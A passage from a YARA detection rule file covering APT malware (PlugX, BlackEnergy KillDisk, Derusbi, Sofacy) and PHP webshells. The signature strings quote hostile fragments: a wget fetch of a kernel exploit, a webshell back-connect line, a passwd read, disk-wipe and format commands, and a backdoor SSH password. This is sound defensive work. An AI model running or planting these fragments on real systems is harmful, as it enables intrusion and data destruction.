      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 4 of ( $s* ) or 4 of ( $c* ) ) or 1 of ( $x* ) or 6 of ( $c* )
} 

rule Codoso_PGV_PVID_4_RID2CE9 : DEMO EXE FILE G0073 MAL T1050 T1136 {
   meta:
      description = "Detects Codoso APT PlugX Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 10:09:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0073, MAL, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "dropper, Version 1.0" fullword wide
      $x2 = "dropper" fullword wide
      $x3 = "DROPPER" fullword wide
      $x4 = "About dropper" fullword wide
      $s1 = "Microsoft Windows Manager Utility" fullword wide
      $s2 = "SYSTEM\\CurrentControlSet\\Services\\" fullword ascii
      $s3 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify" fullword ascii
      $s4 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3" ascii
      $s5 = "<supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"></supportedOS>" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and 2 of ( $x* ) and 2 of ( $s* )
} 

rule Codoso_PlugX_1_RID2C57 : DEMO EXE FILE G0073 MAL T1136 {
   meta:
      description = "Detects Codoso APT PlugX Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 09:45:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0073, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "GETPASSWORD1" fullword ascii
      $s2 = "NvSmartMax.dll" fullword ascii
      $s3 = "LICENSEDLG" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them
} 

rule Codoso_PGV_PVID_2_RID2CE7 : DEMO EXE FILE G0073 MAL T1050 T1117 T1136 {
   meta:
      description = "Detects Codoso APT PGV PVID Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 10:09:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0073, MAL, T1050, T1117, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost" fullword ascii
      $s1 = "regsvr32.exe /s \"%s\"" fullword ascii
      $s2 = "Help and Support" fullword ascii
      $s3 = "netsvcs" fullword ascii
      $s9 = "%SystemRoot%\\System32\\svchost.exe -k netsvcs" fullword ascii
      $s10 = "winlogon" fullword ascii
      $s11 = "System\\CurrentControlSet\\Services" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 907KB and all of them
} 

rule Codoso_PGV_PVID_1_RID2CE6 : DEMO EXE FILE G0073 MAL T1136 {
   meta:
      description = "Detects Codoso APT PGV PVID Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 10:08:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0073, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Cookie: pgv_pvid=" ascii
      $x2 = "DRIVERS\\ipinip.sys" fullword wide
      $s1 = "TsWorkSpaces.dll" fullword ascii
      $s2 = "%SystemRoot%\\System32\\wiaservc.dll" fullword wide
      $s3 = "/selfservice/microsites/search.php?%016I64d" fullword ascii
      $s4 = "/solutions/company-size/smb/index.htm?%016I64d" fullword ascii
      $s5 = "Microsoft Chart ActiveX Control" fullword wide
      $s6 = "MSChartCtrl.ocx" fullword wide
      $s7 = "{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X}" fullword ascii
      $s8 = "WUServiceMain" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) or 3 of them ) ) or 5 of them
} 

rule Payload_Exe2Hex_RID2CB3 : DEMO SCRIPT T1064 T1136 {
   meta:
      description = "Detects payload generated by exe2hex"
      author = "Florian Roth"
      reference = "https://github.com/g0tmi1k/exe2hex"
      date = "2016-01-15 10:00:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, T1064, T1136"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "set /p \"=4d5a" ascii
      $a2 = "powershell -Command \"$hex=" ascii
      $b1 = "set+%2Fp+%22%3D4d5" ascii
      $b2 = "powershell+-Command+%22%24hex" ascii
      $c1 = "echo 4d 5a " ascii
      $c2 = "echo r cx >>" ascii
      $d1 = "echo+4d+5a+" ascii
      $d2 = "echo+r+cx+%3E%3E" ascii
   condition: 
      all of ( $a* ) or all of ( $b* ) or all of ( $c* ) or all of ( $d* )
} 

rule Webshell_AcidPoison_RID2E8F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Poison Sh3ll - Webshell"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 11:19:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "elseif ( enabled(\"exec\") ) { exec($cmd,$o); $output = join(\"\\r\\n\",$o); }" fullword ascii
   condition: 
      filesize < 550KB and all of them
} 

rule Webshell_Backdoor_PHP_Agent_r57_mod_bizzz_shell_r57_RID3A88 : DEMO MAL T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files Backdoor.PHP.Agent.php, r57.mod-bizzz.shell.txt ..."
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 19:50:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$_POST['cmd'] = which('" ascii
      $s2 = "$blah = ex(" fullword ascii
   condition: 
      filesize < 600KB and all of them
} 

rule Webshell_c100_RID2B9A : DEMO T1087 T1100 T1105 T1136 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files c100 v. 777shell"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 09:13:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1087, T1100, T1105, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)" fullword ascii
      $s1 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\">" fullword ascii
      $s3 = "cut -d: -f1,2,3 /etc/passwd | grep ::" ascii
      $s4 = "which wget curl w3m lynx" ascii
      $s6 = "netstat -atup | grep IST" ascii
   condition: 
      filesize < 685KB and 2 of them
} 

rule Webshell_27_9_acid_c99_locus7s_RID31FA : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files 27.9.txt, acid.php, c99_locus7s.txt"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 13:45:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$blah = ex($p2.\" /tmp/back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
      $s1 = "$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\";" fullword ascii
   condition: 
      filesize < 1711KB and 1 of them
} 

rule Webshell_27_9_c66_c99_RID2E09 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files 27.9.txt, c66.php, c99-shadows-mod.php, c99.php, c993.txt ..."
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 10:57:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "if (!empty($unset_surl)) {setcookie(\"c99sh_surl\"); $surl = \"\";}" fullword ascii
      $s6 = "@extract($_REQUEST[\"c99shcook\"]);" fullword ascii
      $s7 = "if (!function_exists(\"c99_buff_prepare\"))" fullword ascii
   condition: 
      filesize < 685KB and 1 of them
} 

rule Webshell_Ayyildiz_RID2DF5 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Webshell"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 10:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\\\">Parent Directory</option>\\n\";" fullword ascii
      $s1 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";" fullword ascii
   condition: 
      filesize < 112KB and all of them
} 

rule Webshell_acid_FaTaLisTiCz_Fx_fx_p0isoN_sh3ll_x0rg_byp4ss_256_RID3D6B : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files acid.php, FaTaLisTiCz_Fx.txt, fx.txt, p0isoN.sh3ll.txt, x0rg.byp4ss.txt"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 21:53:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<form method=\"POST\"><input type=hidden name=act value=\"ls\">" fullword ascii
      $s2 = "foreach($quicklaunch2 as $item) {" fullword ascii
   condition: 
      filesize < 882KB and all of them
} 

rule Webshell_acid_AntiSecShell_3_RID31C7 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Webshell Acid"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 13:37:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo \"<option value=delete\".($dspact == \"delete\"?\" selected\":\"\").\">Delete</option>\";" fullword ascii
      $s1 = "if (!is_readable($o)) {return \"<font color=red>\".view_perms(fileperms($o)).\"</font>\";}" fullword ascii
   condition: 
      filesize < 900KB and all of them
} 

rule Webshell_r57shell_2b_RID2E8F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Webshell R57"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 11:19:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$connection = @ftp_connect($ftp_server,$ftp_port,10);" fullword ascii
      $s2 = "echo $lang[$language.'_text98'].$suc.\"\\r\\n\";" fullword ascii
   condition: 
      filesize < 900KB and all of them
} 

rule Webshell_zehir_RID2CC8 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files elmaliseker.asp, zehir.asp, zehir.txt, zehir4.asp, zehir4.txt"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 10:03:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';" fullword ascii
      $s2 = "if (frmUpload.max.value<=0) frmUpload.max.value=1;" fullword ascii
   condition: 
      filesize < 200KB and 1 of them
} 

rule Webshell_c99_4_RID2C0E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects C99 Webshell"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 09:32:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "displaysecinfo(\"List of Attributes\",myshellexec(\"lsattr -a\"));" fullword ascii
      $s2 = "displaysecinfo(\"RAM\",myshellexec(\"free -m\"));" fullword ascii
      $s3 = "displaysecinfo(\"Where is perl?\",myshellexec(\"whereis perl\"));" fullword ascii
      $s4 = "$ret = myshellexec($handler);" fullword ascii
      $s5 = "if (posix_kill($pid,$sig)) {echo \"OK.\";}" fullword ascii
   condition: 
      filesize < 900KB and 1 of them
} 

rule BlackEnergy_Driver_USBMDM_RID304A : APT DEMO EXE FILE T1136 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/"
      date = "2016-01-04 12:33:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "USB MDM Driver" fullword wide
      $s2 = "KdDebuggerNotPresent" fullword ascii
      $s3 = "KdDebuggerEnabled" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 180KB and all of them
} 

rule BlackEnergy_Driver_AMDIDE_RID3026 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/"
      date = "2016-01-04 12:27:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = " AMD IDE driver" fullword wide
      $s2 = "SessionEnv" fullword wide
      $s3 = "\\DosDevices\\{C9059FFF-1C49-4445-83E8-" wide
      $s4 = "\\Device\\{C9059FFF-1C49-4445-83E8-" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and all of them
} 

rule BlackEnergy_VBS_Agent_RID2EF0 : APT DEMO SCRIPT T1021 T1136 {
   meta:
      description = "Detects VBS Agent from BlackEnergy Report - file Dropbearrun.vbs"
      author = "Florian Roth"
      reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
      date = "2016-01-03 11:35:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, SCRIPT, T1021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "WshShell.Run \"dropbear.exe -r rsa -d dss -a -p 6789\", 0, false" fullword ascii
      $s1 = "WshShell.CurrentDirectory = \"C:\\WINDOWS\\TEMP\\Dropbear\\\"" fullword ascii
      $s2 = "Set WshShell = CreateObject(\"WScript.Shell\")" fullword ascii
   condition: 
      filesize < 1KB and 2 of them
} 

rule DropBear_SSH_Server_RID2E43 : APT DEMO EXE FILE T1021 T1136 {
   meta:
      description = "Detects DropBear SSH Server (not a threat but used to maintain access)"
      author = "Florian Roth"
      reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
      date = "2016-01-03 11:07:01"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Dropbear server v%s https://matt.ucc.asn.au/dropbear/dropbear.html" fullword ascii
      $s2 = "Badly formatted command= authorized_keys option" fullword ascii
      $s3 = "This Dropbear program does not support '%s' %s algorithm" fullword ascii
      $s4 = "/etc/dropbear/dropbear_dss_host_key" fullword ascii
      $s5 = "/etc/dropbear/dropbear_rsa_host_key" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them
} 

rule BlackEnergy_BackdoorPass_DropBear_SSH_RID352E : APT DEMO EXE FILE T1021 T1136 {
   meta:
      description = "Detects the password of the backdoored DropBear SSH Server - BlackEnergy"
      author = "Florian Roth"
      reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
      date = "2016-01-03 16:02:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "passDs5Bu9Te7" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and $s1
} 

rule BlackEnergy_KillDisk_1_RID2F5E : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects KillDisk malware from BlackEnergy"
      author = "Florian Roth"
      reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
      date = "2016-01-03 11:54:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "system32\\cmd.exe" fullword ascii
      $s1 = "system32\\icacls.exe" fullword wide
      $s2 = "/c del /F /S /Q %c:\\*.*" fullword ascii
      $s3 = "shutdown /r /t %d" fullword ascii
      $s4 = "/C /Q /grant " fullword wide
      $s5 = "%08X.tmp" fullword ascii
      $s6 = "/c format %c: /Y /X /FS:NTFS" fullword ascii
      $s7 = "/c format %c: /Y /Q" fullword ascii
      $s8 = "taskhost.exe" fullword wide
      $s9 = "shutdown.exe" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 8 of them
} 

rule BlackEnergy_KillDisk_2_RID2F5F : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects KillDisk malware from BlackEnergy"
      author = "Florian Roth"
      reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
      date = "2016-01-03 11:54:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "%c:\\~tmp%08X.tmp" fullword ascii
      $s1 = "%s%08X.tmp" fullword ascii
      $s2 = ".exe.sys.drv.doc.docx.xls.xlsx.mdb.ppt.pptx.xml.jpg.jpeg.ini.inf.ttf" fullword wide
      $s3 = "%ls_%ls_%ls_%d.~tmp" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 3 of them
} 

rule Emissary_APT_Malware_1_RID2F5A : APT DEMO EXE FILE MAL T1085 T1136 {
   meta:
      description = "Detect Emissary Malware - from samples A08E81B411.DAT, ishelp.dll"
      author = "Florian Roth"
      reference = "http://goo.gl/V0epcf"
      date = "2016-01-02 11:53:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd.exe /c %s > %s" fullword ascii
      $s2 = "execute cmd timeout." fullword ascii
      $s3 = "rundll32.exe \"%s\",Setting" fullword ascii
      $s4 = "DownloadFile - exception:%s." fullword ascii
      $s5 = "CDllApp::InitInstance() - Evnet create successful." fullword ascii
      $s6 = "UploadFile - EncryptBuffer Error" fullword ascii
      $s7 = "WinDLL.dll" fullword wide
      $s8 = "DownloadFile - exception:%s,code:0x%08x." fullword ascii
      $s9 = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" fullword ascii
      $s10 = "CDllApp::InitInstance() - Evnet already exists." fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and 3 of them
} 

rule WebShell_PHP_Web_Kit_v3_RID2F7A : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detects PAS Tool PHP Web Kit"
      author = "Florian Roth"
      reference = "https://github.com/wordfence/grizzly"
      date = "2016-01-01 11:58:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $php = "<?php $" 
      $php2 = "@assert(base64_decode($_REQUEST[" 
      $s1 = "(str_replace(\"\\n\", '', '" 
      $s2 = "(strrev($" ascii
      $s3 = "de'.'code';" ascii
   condition: 
      ( ( uint32 ( 0 ) == 0x68703f3c and $php at 0 ) or $php2 ) and filesize > 8KB and filesize < 100KB and all of ( $s* )
} 

rule WebShell_PHP_Web_Kit_v4_RID2F7B : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detects PAS Tool PHP Web Kit"
      author = "Florian Roth"
      reference = "https://github.com/wordfence/grizzly"
      date = "2016-01-01 11:59:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $php = "<?php $" 
      $s1 = "(StR_ReplAcE(\"\\n\",''," 
      $s2 = ";if(PHP_VERSION<'5'){" ascii
      $s3 = "=SuBstr_rePlACe(" ascii
   condition: 
      uint32 ( 0 ) == 0x68703f3c and $php at 0 and filesize > 8KB and filesize < 100KB and 2 of ( $s* )
} 

rule Derusbi_Kernel_Driver_WD_UDFS_RID31F5 : APT DEMO EXE FILE T1014 T1050 T1136 {
   meta:
      description = "Detects Derusbi Kernel Driver"
      author = "Florian Roth"
      reference = "http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family"
      date = "2015-12-15 13:44:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1014, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\\\.\\pipe\\usbpcex%d" fullword wide
      $x2 = "\\\\.\\pipe\\usbpcg%d" fullword wide
      $x3 = "\\??\\pipe\\usbpcex%d" fullword wide
      $x4 = "\\??\\pipe\\usbpcg%d" fullword wide
      $x5 = "$$$--Hello" fullword ascii
      $x6 = "Wrod--$$$" fullword ascii
      $s1 = "\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" fullword wide
      $s2 = "Update.dll" fullword ascii
      $s3 = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\WMI" fullword wide
      $s4 = "\\Driver\\nsiproxy" fullword wide
      $s5 = "HOST: %s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and ( 2 of ( $x* ) or all of ( $s* ) )
} 

rule Derusbi_Code_Signing_Cert_RID30D4 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects an executable signed with a certificate also used for Derusbi Trojan - suspicious"
      author = "Florian Roth"
      reference = "http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family"
      date = "2015-12-15 12:56:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Fuqing Dawu Technology Co.,Ltd.0" fullword ascii
      $s2 = "XL Games Co.,Ltd.0" fullword ascii
      $s3 = "Wemade Entertainment co.,Ltd0" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and 1 of them
} 

rule XOR_4byte_Key_RID2BD9 : APT DEMO EXE FILE {
   meta:
      description = "Detects an executable encrypted with a 4 byte XOR (also used for Derusbi Trojan)"
      author = "Florian Roth"
      reference = "http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family"
      date = "2015-12-15 09:24:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "1.7"
      
   strings:
      $s1 = { 85 C9 74 0A 31 06 01 1E 83 C6 04 49 EB F2 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of them
} 

rule Sofacy_Malware_StrangeSpaces_RID3230 : APT DEMO EXE FILE G0007 MAL RUSSIA T1136 {
   meta:
      description = "Detetcs strange strings from Sofacy malware with many spaces"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/"
      date = "2015-12-04 13:54:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, MAL, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "Delete Temp Folder Service                                  " fullword wide
      $s3 = " Operating System                        " fullword wide
      $s4 = "Microsoft Corporation                                       " fullword wide
      $s5 = " Microsoft Corporation. All rights reserved.               " fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 3 of them
} 

rule Sofacy_Malware_AZZY_Backdoor_1_RID325F : APT DEMO EXE FILE G0007 MAL RUSSIA T1136 {
   meta:
      description = "AZZY Backdoor - Sample 1"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/"
      date = "2015-12-04 14:02:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, MAL, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "advstorshell.dll" fullword wide
      $s1 = "advshellstore.dll" fullword ascii
      $s2 = "Windows Advanced Storage Shell Extension DLL" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them
} 

rule Sofacy_AZZY_Backdoor_Implant_1_RID326B : APT DEMO EXE FILE G0007 MAL RUSSIA T1136 {
   meta:
      description = "AZZY Backdoor Implant 4.3 - Sample 1"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/"
      date = "2015-12-04 14:04:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, MAL, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\tf394kv.dll" fullword wide
      $s2 = "DWN_DLL_MAIN.dll" fullword ascii
      $s3 = "?SendDataToServer_2@@YGHPAEKEPAPAEPAK@Z" ascii
      $s4 = "?Applicate@@YGHXZ" ascii
      $s5 = "?k@@YGPAUHINSTANCE__@@PBD@Z" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them
} 

rule Sofacy_AZZY_Backdoor_HelperDLL_RID3242 : APT DEMO EXE FILE G0007 MAL RUSSIA T1136 {
   meta:
      description = "Dropped C&C helper DLL for AZZY 4.3"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/"
      date = "2015-12-04 13:57:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, MAL, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "snd.dll" fullword ascii
      $s1 = "InternetExchange" fullword ascii
      $s2 = "SendData" 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them
} 

rule Sofacy_CollectorStealer_Gen1_RID31F6 : APT DEMO EXE FILE G0007 RUSSIA T1136 {
   meta:
      description = "Generic rule to detect Sofacy Malware Collector Stealer"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/"
      date = "2015-12-04 13:44:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "NvCpld.dll" fullword ascii
      $s1 = "NvStop" fullword ascii
      $s2 = "NvStart" fullword ascii
